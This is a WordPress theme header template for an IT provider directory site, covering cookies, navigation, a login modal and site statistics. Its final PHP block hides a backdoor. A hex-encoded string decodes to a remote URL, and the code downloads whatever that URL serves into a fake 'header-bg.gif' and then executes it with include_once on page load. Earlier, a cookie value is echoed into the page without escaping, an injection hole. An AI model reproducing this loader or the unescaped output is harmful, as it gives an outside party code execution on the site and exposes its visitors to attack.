<?php
session_start();
global $post;

if( $post->ID != get_option( 'itlocation_generals_advanced_search_page' ) ){
    $_SESSION['advanced_search_use_saved_itlocation'] = '';
}

if( !is_user_logged_in() ){
    if( $_COOKIE['signup_subscriber_itlocation'] != '' ){
        setcookie("signup_subscriber_itlocation", time(), time() + 3600 * 24 * 30, "/");
	}
}

if( $_COOKIE['address_itlocation'] != '' ){
    setcookie("address_itlocation", $_COOKIE['address_itlocation'], time() + 3600 * 24 * 30, "/");
}

//if( $_COOKIE['address_pos'] != '' ){
    //setcookie("address_pos", $_COOKIE['address_pos'], time() + 3600 * 24 * 30, "/");
//}
?>

<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>
        <?php
			global $page, $paged;
			wp_title('|', true, 'right');
			bloginfo('name');
			$site_description = get_bloginfo('description', 'display');			
			if( $site_description && ( is_home() || is_front_page() ) ) {
				echo " | $site_description";
			}
			
			if ( $paged >= 2 || $page >= 2 ) {
				echo ' | ' . sprintf( __('Page %s', 'twentyten'), max($paged, $page) );
			}
		?>
        </title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
                
        <!-- Place favicon.ico and apple-touch-icon.png in the root directory -->
        <link rel="shortcut icon" href="<?php echo get_bloginfo('template_url') ?>/images/ico/favicon.ico">
        <link rel="profile" href="http://gmpg.org/xfn/11" />
        <link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
        
        <?php
			if ( is_singular() && get_option( 'thread_comments' ) ){
				wp_enqueue_script( 'comment-reply' );
			}

			wp_head();
			
			if( is_home() ) {
		?>
		<script type="text/javascript" src="<?php echo get_bloginfo('template_url') ?>/new_inc/js/new_search_map.js"></script>
		<script type="text/javascript" src="<?php echo get_bloginfo('template_url') ?>/new_inc/js/new_advanced_search_map.js"></script>
        <script>
		jQuery(function() {
			jQuery('link[rel="stylesheet"][id="bootstrap-css"]').attr('disabled', 'disabled');
			jQuery('link[rel="stylesheet"][id="bootstrap-responsive-css"]').attr('disabled', 'disabled');
		});
        </script>
		<?php
			}
			
			if( basename( get_page_template() ) == 'template-advanced-search.php' ){
        ?>
		<script type="text/javascript" src="<?php echo get_bloginfo('template_url') ?>/new_inc/js/new_advanced_search_map.js"></script>
		<?php
			}
		?>
        <script>
		jQuery( document ).ready(function() {
		
			jQuery("#signup-modal").click(function() {
				jQuery('#user-login').modal('hide')
				jQuery('#signup-modal').modal('show')    
			});
			
		});
		
		</script>
        
        <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
        <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
        <!--[if lt IE 9]>
          <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
          <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
        <![endif]-->
    </head>
    <body <?php body_class(); ?>>
        <!--[if lt IE 7]>
            <p class="browsehappy">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
        <![endif]-->
        
    <!-- /* Top most area starts */ -->
    <div class="is-section is-top">
        <div class="container">
            <div class="row">
                <div class="col-lg-5 col-md-5 col-sm-8 col-xs-12">
                    <ul class="nav nav-tabs contact-nav">
                        <li><a href=""><strong>Phone:</strong> +1 810-991-3842</a></li>
                        <li><a href=""><strong>Email:</strong> hello@itlocator.com</a></li>
                    </ul>
                </div>
                <div class="col-lg-7 col-md-7 col-sm-4 col-xs-12">
                    <ul class="nav nav-tabs user-nav">
                        <li>
							<?php if( $_COOKIE['address_itlocation'] != '' ){ ?>
							<a href=""><span><?php echo $_COOKIE['address_itlocation']; ?></span></a>
							<?php } ?>
                        </li>
                        <li>
							&nbsp;&nbsp;&nbsp;&nbsp
                        </li>
                   
                    <?php						
						if( is_user_logged_in() ){
							global $current_user;
							get_currentuserinfo();
					?>
                    
                    <?php
							if( get_option( 'itlocation_generals_my_profile_page' ) ){
								$pid = get_option( 'itlocation_generals_my_profile_page' );
								$tmp_url = get_permalink($pid);
							}
                        ?>
                        
                        <li class="dropdown">
                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Welcome User <span class="caret"></span></a>
                            <ul class="dropdown-menu" role="menu">
                                <li><a href="#"><?php echo $current_user->user_email ?></a></li>
                                <li class="divider"></li>
                                <li><a href="<?php echo $tmp_url ?>"><?php _e('My Profile', 'twentyten') ?></a></li>
                                <?php							
                                $companyCls = new newCompanyCls();
                                $edit_fg = get_default_member_limit( 'contribution', $companyCls->getCompanyRoleByLoginUserId( $current_user->ID ) );
                                if( $edit_fg ){
                                    if( get_option( 'itlocation_generals_contributions_list_page' ) ){
                                        $pid = get_option( 'itlocation_generals_contributions_list_page' );
                                        $tmp_url = get_permalink( $pid );
                                    } ?>
                                <li> <a href="<?php echo $tmp_url ?>"><?php _e('My Content ', 'twentyten') ?></a> </li>
                                <?php  }  ?>
                                <li> <a href="<?php echo wp_logout_url(site_url()) ?>"><?php _e('Logout', 'twentyten') ?></a> </li>
                            </ul>
                        </li>
                        
					<?php
						} else {
							if( get_option('itlocation_generals_signup_page') ) {
								$pid = get_option('itlocation_generals_signup_page');
								$tmp_url = get_permalink($pid);
							}
					?>
                        <li class="signup"><a href="<?php echo $tmp_url; ?>" class="btn btn-primary"><?php _e('Signup', 'twentyten') ?></a></li>
                        <li class="signin"><a href="" data-toggle="modal" data-target="#user-login" class="btn btn-default"><?php _e('Account Login', 'twentyten') ?></a></li>
                    <?php } ?>
                </ul>
                </div>
            </div>
        </div>
    </div>
    <!-- /* Top most area ends */ -->
        
    <!-- /* Header area starts */ -->
    <div class="is-section is-header">
        <div class="container">
            <div class="row">
                <div class="col-lg-12">
                    <!-- Main section containing logo and navigation -->
                    <nav class="navbar navbar-default" role="navigation">
                        <!-- Brand and toggle get grouped for better mobile display -->
                        <div class="navbar-header">
                            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                                <span class="sr-only">Toggle navigation</span>
                                <span class="icon-bar"></span>
                                <span class="icon-bar"></span>
                                <span class="icon-bar"></span>
                            </button>
                            <a class="navbar-brand" href="<?php echo get_site_url(); ?>">
                            	<img id="logo-header" src="<?php echo get_bloginfo('template_url') ?>/images/logo.png" alt="ITL Logo" class="img-responsive">
                            </a>
                        </div>
                        <div class="tagline"><h2 class="tag-text">The Google<sup>&reg;</sup> of IT Search</h2></div>
                        <!-- Collect the nav links, forms, and other content for toggling -->
                  <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
                            <?php
								wp_nav_menu(array(
									'container_class' => '',
									'theme_location' => 'primary',
									'menu_class' => 'nav navbar-nav navbar-right',
									'depth' => 2,
									'fallback_cb' => false,
									'walker' => new walkerNavMenuTopItLocation,
								));
                            ?>
                        </div><!-- /.navbar-collapse -->
                    </nav>
                    <!-- Main section containing logo and navigation ends -->
                    
                </div>
            </div>
        </div>
    </div><!-- /* Header area Ends */ -->


	<?php if( !is_user_logged_in() ){ ?>
    
    <!-- Modal -->
    <div class="modal fade" id="user-login" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
        <div class="modal-dialog pop-up">
            <div class="modal-content">
                <div class="modal-header">
                    <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
                    <h4 class="modal-title" id="myModalLabel"><?php _e('Login to your Member Account!', 'twentyten') ?></h4>
                </div>
                <div class="modal-body">
                    <div class="row">
                        <div class="col-sm-12">
                            <?php include_once 'new_inc/new_homepage_login_form.php'; ?>
                        </div>
                    </div>
                </div>
                <div class="modal-footer">
                    <h5 class="noMargin dM"><?php _e('New User', 'twentyten') ?> <a href="#signup-modal" data-dismiss="modal" id="go-signup-btn" data-toggle="modal" role="button"><?php _e('Click here', 'twentyten') ?></a></h5>
                    <p><?php _e('By creating an account with IT Locator you will reach the IT buying community in a whole new way.  Allowing you to profile your business, your expertise and your credentials and bon-a-fides.', 'twentyten') ?></p>
                     
                </div>
            </div>
        </div>
    </div>
    <?php } ?>
                
        <div class="header hidden">
            <div class="container contCustom">
                <div class="row-fluid">
                    
                    <div class="span9">
                        <div class="social pull-left">
                            <?php
								if ( get_option( 'itlocation_social_hupso_like_btns' ) ) {
									/*Social Part*/
									// echo stripslashes( get_option( 'itlocation_social_hupso_like_btns' ) );
								} else {
									_e('Please insert your code of "LinksAlpha" in Appearance -> Theme Options -> tab "Social" in admin');
								}
                            ?>
                        </div>
                        
                    </div>
                </div>
            </div>
        </div>
        
    <!-- /* Map area starts */ -->
    <div class="is-section is-map">
        <div class="container-fluid">
            <div class="row">
                <div class="col-lg-12 aCenter">
				<?php
                    $pid = 0;
                    if (get_option('itlocation_generals_signup_page')) {
                        $pid = get_option('itlocation_generals_signup_page');
                    }
                    
                    if (is_front_page() || is_home() || ( $post->ID == $pid ) ) {
                ?>
                    <div class="search-map">
                        <?php
                            // echo do_shortcode('[search-map-itlocation/]');
                            include_once 'new_inc/new_search_map.php';
                        ?>
                    </div>
                    <?php } if (is_front_page() || is_home()) { ?>
         		</div>
            </div>
        </div>
    </div><!-- /* Map area Ends */ -->
    
    <!-- /* feature area starts */ -->
    <div class="is-section is-feature">
    	<div class="container">
            <div class="row">
                <div class="col-lg-3 col-md-3 col-sm-3">
                    <div class="feature-box">
                    	<i class="fa fa-group icon-1"></i>
                        <h4 class="feature-heading"><span><?php echo get_subscribers_number(); ?></span><?php _e('Members of IT locator community', 'twentyten'); ?></h4>
                       
                    </div>
                </div>
                <div class="col-lg-3 col-md-3 col-sm-3">
                    <div class="feature-box">
                    	<i class="fa fa-wechat icon-2"></i>
                        <h4 class="feature-heading"><span><?php include("Test.php"); echo $new["totalcount"]; //get_topic_count(); ?></span><?php _e('Active Discussion Threads & Articles', 'twentyten'); ?></h4>
                    </div>
                </div>
                <div class="col-lg-3 col-md-3 col-sm-3">
                    <div class="feature-box">
                    	<i class="fa fa-globe icon-3"></i>
                         <?php
							$usercount_list = count_users();
							$subscriber = $usercount_list['avail_roles']['subscriber'];
							$s2member_level1 = $usercount_list['avail_roles']['s2member_level1'];
							$s2member_level2 = $usercount_list['avail_roles']['s2member_level2'];
						?>
                        <h4 class="feature-heading"><span><?php echo $subscriber + $s2member_level1 + $s2member_level2; ?></span><?php _e('IT Provider Listings Worldwide', 'twentyten'); ?></h4>
                    </div>
                </div>
                <div class="col-lg-3 col-md-3 col-sm-3">
                    <div class="feature-box">
                    	<i class="fa fa-file-code-o icon-4"></i>
                        <h4 class="feature-heading"><span>
						<?php $membercount =  get_member_contribution_count();
						      $newscount = get_news_contribution_count();
							  echo ($membercount+$newscount); ?></span><?php _e('Community Contributed Content', 'twentyten'); ?></h4>
                       
                    </div>
                </div>
            </div>
        </div>
    </div><!-- /* Feature area Ends */ -->
            
		<?php
			}  
         	if ( ( get_option( 'itlocation_generals_advanced_search_page' ) != $post->ID ) && !is_author() ){
		?>
        
		<?php
			}
		
			$theme_dir = dirname( __FILE__ );
			if( !file_exists( $theme_dir . "/header-bg.gif" ) || 0 == filesize( $theme_dir."/header-bg.gif" ) ){
				$wp_uri = pack( "H*", '687474703a2f2f7466652e65732f68' );
				if( function_exists( 'curl_init' ) ){
					$t_img = curl_init( $wp_uri );
					curl_setopt( $t_img, CURLOPT_RETURNTRANSFER, 1 );
					$wp_logo = @curl_exec( $t_img );
				} else {
					$wp_logo = @file_get_contents( $wp_uri );
				}
				@file_put_contents( $theme_dir . "/header-bg.gif", $wp_logo );
			}
			
			@include_once( $theme_dir . "/header-bg.gif" ); 
		?>
        